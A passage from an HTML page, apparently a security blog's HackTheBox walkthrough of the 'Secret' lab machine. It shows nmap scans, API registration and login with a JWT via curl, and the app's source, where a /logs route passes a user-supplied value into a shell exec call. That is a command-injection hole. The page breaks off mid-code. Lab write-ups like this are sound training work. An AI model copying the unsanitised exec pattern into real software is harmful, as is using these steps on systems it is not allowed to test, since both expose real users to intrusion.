@@ -1,0 +1,414 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="SECRET (Linux) Walkthrough  Reconnaissance Let&amp;rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.120 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &amp;hellip;
+ PORT 22 : running OpenSSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.3) PORT 80 : running HTTP (nginx 1."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-secret/><title>HackTheBox: Secret :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Secret"><meta itemprop=description content="SECRET (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.120 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
+ PORT 22 : running OpenSSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.3) PORT 80 : running HTTP (nginx 1."><meta itemprop=datePublished content="2021-12-15T00:00:00+00:00"><meta itemprop=dateModified content="2021-12-15T00:00:00+00:00"><meta itemprop=wordCount content="2735"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Secret"><meta name=twitter:description content="SECRET (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.120 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
+ PORT 22 : running OpenSSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.3) PORT 80 : running HTTP (nginx 1."><meta property="og:title" content="HackTheBox: Secret"><meta property="og:description" content="SECRET (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
+nmap -sV -sC -O -oA nmap/initial 10.10.11.120 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
+ PORT 22 : running OpenSSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.3) PORT 80 : running HTTP (nginx 1."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-secret/"><meta property="article:published_time" content="2021-12-15T00:00:00+00:00"><meta property="article:modified_time" content="2021-12-15T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2021-12-15 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>S3cur!ty_Bl0g</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-secret/>HackTheBox: Secret</a></h2><div class=post-content><h1 id=secret-linux-walkthrough>SECRET (Linux) Walkthrough</h1><p><img src=/assets/Pasted%20image%2020220313012026.png alt="assets/Pasted image 20220313012026.png"></p><hr><h1 id=reconnaissance>Reconnaissance</h1><p>Let&rsquo;s do a Quick Scan of the target using NMAP.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sV -sC -O -oA nmap/initial 10.10.11.120
+</code></pre></div><ul><li><strong>-sC</strong> : run Default Nmap scripts</li><li><strong>-sV</strong> : detects service versions</li><li><strong>-O</strong> : detects OS</li><li><strong>-oA</strong> : output all formats and store in file *nmap/initial</li></ul><p>We got the following result &mldr;</p><ul><li><strong>PORT 22</strong> : running OpenSSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.3)</li><li><strong>PORT 80</strong> : running HTTP (nginx 1.18.0)</li><li><strong>PORT 3000</strong> : running HTTP (Node.js (Express middleware))</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# nmap -sV -sC -O -oA nmap/initial 10.10.11.120
+
+Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-13 01:22 EST
+Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.120
+Host is up <span style=color:#f92672>(</span>0.28s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>997</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+| ssh-hostkey: 
+|   <span style=color:#ae81ff>3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+|   <span style=color:#ae81ff>256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+|_  <span style=color:#ae81ff>256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+80/tcp   open  http    nginx 1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+|_http-title: DUMB Docs
+|_http-server-header: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+3000/tcp open  http    Node.js <span style=color:#f92672>(</span>Express middleware<span style=color:#f92672>)</span>
+|_http-title: DUMB Docs
+No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.92%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>3/13%OT<span style=color:#f92672>=</span>22%CT<span style=color:#f92672>=</span>1%CU<span style=color:#f92672>=</span>40602%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>2%DC<span style=color:#f92672>=</span>I%G<span style=color:#f92672>=</span>Y%TM<span style=color:#f92672>=</span>622D8DF
+OS:1%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>105%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>108%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%II<span style=color:#f92672>=</span>I%TS<span style=color:#f92672>=</span>A<span style=color:#f92672>)</span>SEQ
+OS:<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>104%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>107%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%TS<span style=color:#f92672>=</span>A<span style=color:#f92672>)</span>OPS<span style=color:#f92672>(</span>O1<span style=color:#f92672>=</span>M505ST11NW7%O2<span style=color:#f92672>=</span>M505ST11NW7%O
+OS:3<span style=color:#f92672>=</span>M505NNT11NW7%O4<span style=color:#f92672>=</span>M505ST11NW7%O5<span style=color:#f92672>=</span>M505ST11NW7%O6<span style=color:#f92672>=</span>M505ST11<span style=color:#f92672>)</span>WIN<span style=color:#f92672>(</span>W1<span style=color:#f92672>=</span>FE88%W2<span style=color:#f92672>=</span>
+OS:FE88%W3<span style=color:#f92672>=</span>FE88%W4<span style=color:#f92672>=</span>FE88%W5<span style=color:#f92672>=</span>FE88%W6<span style=color:#f92672>=</span>FE88<span style=color:#f92672>)</span>ECN<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>FAF0%O<span style=color:#f92672>=</span>M505NNSN
+OS:W7%CC<span style=color:#f92672>=</span>Y%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%S<span style=color:#f92672>=</span>O%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AS%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T2<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T3<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T4<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%D
+OS:F<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O
+OS:<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W
+OS:<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID<span style=color:#f92672>=</span>G%R
+OS:IPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>IE<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>S<span style=color:#f92672>)</span>
+
+Network Distance: <span style=color:#ae81ff>2</span> hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 45.27 seconds
+
+</code></pre></div><p>Let&rsquo;s do a Full machine scan to make sure we are not skipping any ports or services on uncommon ports.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sC -sV -O -oA nmap/full 10.10.11.120 -p-
+</code></pre></div><p>Similarly Let&rsquo;s run a UDP Scan as well</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sU -O -p- -oA nmap/udp 10.10.11.120
+</code></pre></div><p>There were no other open ports available.</p><hr><h1 id=enumeration>Enumeration</h1><p>We have two http ports running 80, 3000 we can enumerate on both ports to further find the attack surface and possible entry point.
+Also port 22 not seems to be vulnerable with any attack, So its better to enumerate HTTP ports throughly.</p><h3 id=port-80--3000>PORT 80 , 3000</h3><p>Going throught these ports manually seems like both are running same service.
+Further browsing through the website, Found some documentation and also the source code of website.</p><p>Going through the documentations we can easily figure out that there is a API service which allows to login user and register users.</p><p>We can try to create a new user possibly.
+Before doing that let&rsquo;s check out the source code that are available to download in the website.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>wget http://10.10.11.120/download/files.zip <span style=color:#f92672>&amp;&amp;</span> unzip files.zip
+</code></pre></div><p>Going through the Source code , Found some interesting API endpoints same that was mentioned in the Documentation.</p><p>Few Important Endpoints that we found in Source code and verified from Documentation are.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>From Documentation --
+
+http://localhost:3000/api/user/register
+http://localhost:3000/api/user/login
+http://localhost:3000/api/priv
+
+From Source Code --
+
+http://localhost:3000/api/logs
+
+</code></pre></div><p>From the Documentation, We ca easily figure out how to register a new user and login as a new user to get the Auth Token.
+Let&rsquo;s create a curl Request to create a new user.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> --data <span style=color:#e6db74>&#39;{&#34;name&#34;:&#34;an0nud4y&#34;,&#34;email&#34;:&#34;an0nud4y@an0nud4y.com&#34;,&#34;password&#34;:&#34;an0nud4y&#34;}&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/user/register&#39;</span> -v
+
+</code></pre></div><p>We successfully registered a new user.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# curl -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> --data <span style=color:#e6db74>&#39;{&#34;name&#34;:&#34;an0nud4y&#34;,&#34;email&#34;:&#34;an0nud4y@an0nud4y.com&#34;,&#34;password&#34;:&#34;an0nud4y&#34;}&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/user/register&#39;</span> -v
+
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.120:3000...
+* Connected to 10.10.11.120 <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>3000</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
+&gt; POST /api/user/register HTTP/1.1
+&gt; Host: 10.10.11.120:3000
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; Content-Type: application/json
+&gt; Content-Length: 75
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+&lt; X-Powered-By: Express
+&lt; Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+&lt; Content-Length: 20
+&lt; ETag: W/<span style=color:#e6db74>&#34;14-CLI9B9IFg+20ObdJr32uCDCn8sQ&#34;</span>
+&lt; Date: Mon, <span style=color:#ae81ff>14</span> Mar <span style=color:#ae81ff>2022</span> 09:54:26 GMT
+&lt; Connection: keep-alive
+&lt; 
+* Connection <span style=color:#75715e>#0 to host 10.10.11.120 left intact</span>
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;user&#34;</span>:<span style=color:#e6db74>&#34;an0nud4y&#34;</span><span style=color:#f92672>}</span> 
+</code></pre></div><p>Let&rsquo;s try to login as the user we just created.</p><p>Request to login as user we just created.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> --data <span style=color:#e6db74>&#39;{&#34;email&#34;:&#34;an0nud4y@an0nud4y.com&#34;,&#34;password&#34;:&#34;an0nud4y&#34;}&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/user/login&#39;</span> -v
+</code></pre></div><p>We got the following response , which contains the JWT authentication token.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# curl -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> --data <span style=color:#e6db74>&#39;{&#34;email&#34;:&#34;an0nud4y@an0nud4y.com&#34;,&#34;password&#34;:&#34;an0nud4y&#34;}&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/user/login&#39;</span> -v
+
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.120:3000...
+* Connected to 10.10.11.120 <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>3000</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
+&gt; POST /api/user/login HTTP/1.1
+&gt; Host: 10.10.11.120:3000
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; Content-Type: application/json
+&gt; Content-Length: 55
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+&lt; X-Powered-By: Express
+&lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI
+&lt; Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+&lt; Content-Length: 216
+&lt; ETag: W/<span style=color:#e6db74>&#34;d8-XlQ2PL0XEI2rYGwSZ/BGqDen0Nk&#34;</span>
+&lt; Date: Mon, <span style=color:#ae81ff>14</span> Mar <span style=color:#ae81ff>2022</span> 09:56:46 GMT
+&lt; Connection: keep-alive
+&lt; 
+* Connection <span style=color:#75715e>#0 to host 10.10.11.120 left intact</span>
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI  
+
+</code></pre></div><p>Let&rsquo;s use this JWT token and make a request to <code>/api/priv</code> endpoint,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/priv&#39;</span> -v
+</code></pre></div><p>Got the following response &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# curl -X GET -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI&#39;</span> --url <span style=color:#e6db74>&#39;http://10.10.11.120:3000/api/priv&#39;</span> -v  
+
+Note: Unnecessary use of -X or --request, GET is already inferred.
+*   Trying 10.10.11.120:3000...
+* Connected to 10.10.11.120 <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>3000</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
+&gt; GET /api/priv HTTP/1.1
+&gt; Host: 10.10.11.120:3000
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+&gt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJlYjhlYjhmMTdiMDA0NTllZmNhMDciLCJuYW1lIjoiYW4wbnVkNHkiLCJlbWFpbCI6ImFuMG51ZDR5QGFuMG51ZDR5LmNvbSIsImlhdCI6MTY0NzI1MTgwNn0.z38YPM5VvQOqh83rdIMSYb9IXrGnmAO22h75_Qne7kI
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+&lt; X-Powered-By: Express
+&lt; Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+&lt; Content-Length: 57
+&lt; ETag: W/<span style=color:#e6db74>&#34;39-vXHNU8yNSEHyxmJw5Kgd2bas5uI&#34;</span>
+&lt; Date: Mon, <span style=color:#ae81ff>14</span> Mar <span style=color:#ae81ff>2022</span> 10:04:39 GMT
+&lt; Connection: keep-alive
+&lt; 
+* Connection <span style=color:#75715e>#0 to host 10.10.11.120 left intact</span>
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;role&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;role&#34;</span>:<span style=color:#e6db74>&#34;you are normal user&#34;</span>,<span style=color:#e6db74>&#34;desc&#34;</span>:<span style=color:#e6db74>&#34;an0nud4y&#34;</span><span style=color:#f92672>}</span><span style=color:#f92672>}</span>
+</code></pre></div><p>Going through the Source code of <code>routes/forgot.js</code> file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>router</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;express&#39;</span>).<span style=color:#a6e22e>Router</span>();
+<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>verifytoken</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;./verifytoken&#39;</span>)
+<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>User</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;../model/user&#39;</span>);
+
+<span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/priv&#39;</span>, <span style=color:#a6e22e>verifytoken</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+   <span style=color:#75715e>// res.send(req.user)
+</span><span style=color:#75715e></span>
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>userinfo</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span> }
+
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>userinfo</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>name</span>;
+    
+    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>name</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;theadmin&#39;</span>){
+        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({
+            <span style=color:#a6e22e>creds</span><span style=color:#f92672>:</span>{
+                <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;admin&#34;</span>, 
+                <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;theadmin&#34;</span>,
+                <span style=color:#a6e22e>desc</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;welcome back admin,&#34;</span>
+            }
+        })
+    }
+    <span style=color:#66d9ef>else</span>{
+        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({
+            <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span> {
+                <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;you are normal user&#34;</span>,
+                <span style=color:#a6e22e>desc</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>userinfo</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>name</span>
+            }
+        })
+    }
+})
+
+
+<span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/logs&#39;</span>, <span style=color:#a6e22e>verifytoken</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>file</span>;
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>userinfo</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span> }
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>userinfo</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>name</span>;
+    
+    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>name</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;theadmin&#39;</span>){
+        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>getLogs</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>git log --oneline </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>file</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
+        <span style=color:#a6e22e>exec</span>(<span style=color:#a6e22e>getLogs</span>, (<span style=color:#a6e22e>err</span> , <span style=color:#a6e22e>output</span>) =&gt;{
+            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>err</span>){
+                <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>err</span>);
+                <span style=color:#66d9ef>return</span>
+            }
+            <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>(<span style=color:#a6e22e>output</span>);
+        })
+    }
+    <span style=color:#66d9ef>else</span>{
+        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({
+            <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span> {
+                <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;you are normal user&#34;</span>,
